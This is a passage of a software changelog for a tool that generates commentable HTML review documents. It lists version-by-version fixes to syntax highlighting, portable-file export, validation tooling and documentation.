  SVG figures as caption notes), with the current comments appended as a section. Untrusted text,
  attributes, and comment notes are escaped so the exported Markdown cannot inject raw HTML or
  forge document structure.

### Changed

- The overflow-menu portability badge now shares the sidebar badge's coloring and tooltip
  (via `data-doc-type`), so both convey the same Portable / Not portable semantics.
- Authoring guidance: content-conventions now covers shaping content in real layouts, an
  anti-default-look taste checklist, a readable prose measure (top-level paragraphs are capped while
  tables, figures, and code keep full width), and mapping a product's design tokens onto the
  `--cp-*` variables.

## [1.4.0] - 2026-07-11

### Added

- Help & About: a "Tips and shortcuts" topic for power users (right-click to comment, re-select the same
  text to reopen a comment, multiple and draggable composers, sort back to document order, the Expand and
  Collapse controls, the diff Syntax toggle, and the keyboard shortcuts), plus "Request a feature" and
  "Contribute" links in the About block alongside the existing source and issue links.
- A review-loop diagram (`docs/images/review-loop.svg`) embedded in a new "Review workflow" section of the
  plugin README, showing the agent-to-you-and-back loop and naming the self, peer, and reviewer variants.

### Changed

- Help & About now orients a first-time reviewer. The review-workflow topic points a recipient who was
  sent a file straight to leaving a comment (no agent or account needed), the "Getting started" topic is
  retitled for reviewing a shared file, and the search box suggests "shortcuts".
- `docs/TUTORIAL.md` gained a short "you were sent a file to review" quick start and a pointer to the new
  Tips and shortcuts help topic.

## [1.3.1] - 2026-07-11

### Fixed

- Single-quoted string styles now require their closing quote, so a lone `'` in valid code (a Rust
  lifetime like `&'static str`, an apostrophe like `don't`, or a C++ digit separator `1'000`) is no
  longer swallowed as a string to the end of the line. Double-quoted and backtick strings still
  highlight when unterminated, and string scanning stays linear time.
- CSS highlighting now treats only the CSS-wide keywords (`auto`, `none`, `inherit`, `initial`,
  `unset`, `revert`, `important`) as keywords, so class selectors such as `.block` or `.center` are no
  longer colored as keywords.
- The in-browser diff highlighter matches the case-insensitive keywords of SQL, Batch, and PowerShell
  (uppercase keywords now color), scans strings and comments in linear time for the newly added
  languages, maps the `.m` extension to Objective-C, and no longer over-colors common identifiers
  (`data`, `local`, `end`, and similar) as keywords in unrelated diffs.

## [1.3.0] - 2026-07-11

### Added

- Author-time syntax highlighting (`tools/highlight_code.py`) now covers many more popular languages:
  Rust, Ruby, PHP, Swift, Kotlin, Scala, Dart, R, Perl, PowerShell, Lua, TOML, CSS, Groovy, Elixir,
  Haskell, and Objective-C, plus Windows Batch (`batch`, with `bat` and `cmd` aliases), with the usual
  aliases (`rs`, `rb`, `kt`, `pl`, `ps1`, `ps`, `objc`, `hs`, `ex`, `exs`). Shell scripts were already
  covered via the existing `shell` and `sh` aliases for `bash`. Run
  `python tools/highlight_code.py --list` for the full set.
- The in-browser diff highlighter now recognizes the same expanded language set (CSS, Groovy, Elixir,
  Haskell, Objective-C, Lua, PowerShell, and Windows Batch, plus their aliases), so review diffs in
  those languages render with token colors instead of plain text.

### Fixed

- Keywords are now matched case-sensitively except in genuinely case-insensitive languages (SQL, Batch,
  PowerShell, HTML, CSS). Previously a global case-insensitive match mis-colored ordinary identifiers as
  keywords (for example C# `String`, Python `true`/`none`, Rust `Fn`).
- String tokenization is now linear time. Pathological input (a long run of escaped quotes) previously
  drove superlinear rescanning; the string patterns use an unrolled form that stays fast.
- Strings keep a backslash-newline line continuation inside the string, unterminated block comments and
  strings still highlight (to end of input / end of line), Swift and Dart triple-quoted strings and TOML
  literal (single-quoted) strings are recognized, and a Windows Batch `rem` comment is matched on a word
  boundary (so `rem`, `rem<TAB>`, and a bare `rem` are comments, but `remark` is not).

## [1.2.2] - 2026-07-11

### Changed

- Clarified the NonPortable asset-location wording in the skill reference: the default companion
  files are referenced by a relative path (the skill's `dist/` folder by default), not "beside the
  document"; the document sits beside its companions only when they are copied there.

## [1.2.1] - 2026-07-11

### Changed

- Documentation wording now describes the NonPortable default accurately. The skill reference and the
  plugin README no longer call a generated document "single-file" or "Portable" by default: the default
  NonPortable document loads its CSS/JS from companion files, while Export as Portable (or `--portable`)
  produces the one self-contained file.

## [1.2.0] - 2026-07-11

### Fixed

- Mobile responsiveness of generated documents. Wide tables now scroll horizontally inside their own
  box on narrow screens instead of forcing the whole page to overflow. The Kusto query caption stacks
  the cluster title and the "Run in Azure Data Explorer" link onto separate lines below 700px so they
  no longer cramp. The floating Copy/language pills reserve top headroom over every code block (KQL
  figures included) so they no longer overlap the first line of code. Figures use symmetric vertical
  margins with no side indent so embedded images and charts get the full content width.
- On touch / coarse-pointer devices the browser's native selection menu (Copy, Share, Look up) is left
  intact; the reader can copy selected text again, while the floating "Add comment" popup still handles
  commenting.

### Changed

- `docs/TUTORIAL.md` now references the running example with a skill-root-relative display path that links
  to the local file, so the reference reads cleanly without any `..` path traversal.

## [1.1.3] - 2026-07-11

### Fixed

- Documentation accuracy from the agency review pass: the generated-document header comment (and the
  two shipped example reports) now name the Export as Portable download `<stem>-portable.html`, matching
  the current UI (it previously said `<stem>-comments.html`); and `references/design-decisions.md` now
  states correctly that a `<canvas>` renders when either the Chart.js loader OR an inline `getContext`
  draw is present, so a hand-drawn non-Chart.js canvas is accepted and only a canvas with neither is
  flagged (matching `validate.py` E3).

### Notes

- Documentation-only changes; no code or runtime behavior change.

## [1.1.2] - 2026-07-11

### Fixed

- `chart_block.py`: self-validation writes its temporary file to the system temp directory instead of
  the current working directory, so it works from a read-only directory (matching `new_document.py`).
- `kql_highlight.py`: added a `--` end-of-flags separator so a positional value that begins with `--`
  is taken literally instead of being rejected as an unknown flag.

### Notes

- Follow-up robustness fixes from the agency review pass; no change to the runtime review behavior.

## [1.1.1] - 2026-07-11

### Fixed

- `new_document.py`: corrected docstrings that referenced a removed CLI export tool; `--assets-href "/"`
  now produces root-relative companion references instead of dropping the prefix; a cross-drive `--out`
  gives an actionable message instead of a raw `relpath` error; `--copy-assets` copies the companions
  before writing the HTML so a failed copy never leaves a broken file; the write path reports `OSError`
  cleanly; `--copy-assets` / `--assets-href` warn when combined with `--portable`; a custom `--template`
  defers the companion existence check (it previously always failed self-validation); and self-validation
  no longer writes its temp file under the current working directory, so it works from a read-only
  directory.
- `validate.py`: the NonPortable remote-URL and absolute-path checks always run (they are structural),
  and only the on-disk existence check is gated on `base_dir`, so an `--assets-href` remote/absolute path
  is caught at generation time. Added direct `base_dir` unit tests.
- `inline_images.py`: a missing or unreadable input file now reports a clean error and exits 1 instead
  of raising an uncaught `OSError`.

### Notes

- Fixes surfaced by a 6-model rubber-duck review panel on the NonPortable-first change, plus a
  plugin-description wording tidy-up (drop "single-file" now that NonPortable is the default). No change
  to the runtime review behavior.

## [1.1.0] - 2026-07-11

### Added

- Resizable comments sidebar with a keyboard-focusable drag handle, persisted width, viewport clamps, and matching reserved page space.
- Problem statement plus self-review, peer-review, and reviewer-side review-loop documentation for the generated review surface.
- Documentation that explains when to use NonPortable for fast local iteration and when to Export as Portable for sharing or long-term storage.

### Changed

- Runtime left navigation side menu now labels itself as "Navigation" while leaving author-authored table-of-contents titles alone.
- Sidebar header actions wrap into narrower rows instead of overflowing when the viewport or resized sidebar is narrow.

### Fixed

- Chart.js canvases, including pie and doughnut charts, stay bounded inside `figure.chart` at narrow widths.

## [1.0.2] - 2026-07-11

### Changed

- New documents are now **NonPortable by default** (`tools/new_document.py`): the layer CSS/JS load
  from companion files, so authoring and every regeneration during a review loop is materially
  smaller (about 89% less boilerplate re-emitted). Pass `--portable` for a single self-contained file.

### Added

- `tools/new_document.py` gains `--portable`, `--nonportable` (the default), `--copy-assets`, and
  `--assets-href` to control how a NonPortable document references its companion files, plus
  `active_root_attrs` and an `allow_reserved_key` option for re-stamping an existing document.
- `validate.validate()` accepts an optional `base_dir` so NonPortable companion references can be
  resolved against the file's final location, or the path checks skipped (structure only) when
  placement is deferred.

### Notes

- To hand someone a single shareable file, either regenerate with `--portable` (for a document that
  has no in-browser comments yet) or use the in-page **Export as Portable** button. The button is the
  only path that captures comments the user typed in the browser: those live in `localStorage`, which
  no CLI (even a headless browser) can read, so there is deliberately no CLI export.

## [1.0.1] - 2026-07-10

### Changed

- Hardened the CI version-bump gate (`scripts/check_version_bump.py`): it now diffs from the merge
  base so a PR is judged only on its own changes, fails closed on an invalid or unfetched base ref,
  normalizes source paths correctly, and requires a version bump when a plugin's source path changes.
- Hardened `build.py` version stamping and the build `--check` drift guard.

### Fixed

- Quality fixes surfaced by a multi-model (multi-duck) review of the 1.0.0 refactor, including a
  statically pinned Chart.js loader for a stable SRI hash and assorted tool and documentation
  polish. No change to the runtime review behavior.

## [1.0.0] - 2026-07-10

First official release.

### Added

- Offline, single-file commentable HTML review surface: reviewers select any paragraph, table cell,
  code block, KQL block, chart, image, or mermaid diagram and leave inline comments, then copy or
  export a bundle back to an agent, with no network dependency.
- Portable mode (one self-contained file) and NonPortable mode (companion CSS/JS files).
- Deterministic Python tooling (`new_document`, `inline_images`, `chart_block`, `upgrade`, `validate`,
  and more) plus a standard-library validator that enforces the structural invariants of a generated
  file.
- Rich, commentable content: tables, Chart.js charts, mermaid diagrams, KQL blocks, code-review diffs,
  and inlined images.
- Each generated file stamps the skill version that produced it in a
  `<meta name="commentable-html-version">` in the head and in the visible footer.

### Notes

- The injected layer is version-agnostic: the region markers, the companion filenames, and the demo
  storage keys no longer embed a version. The single source of truth for the release version is
  `dev/VERSION`; `build.py` stamps it into the layer constant, `plugin.json`, the marketplace entry,
  and each document's version `<meta>`, and `build.py --check` guards against drift.
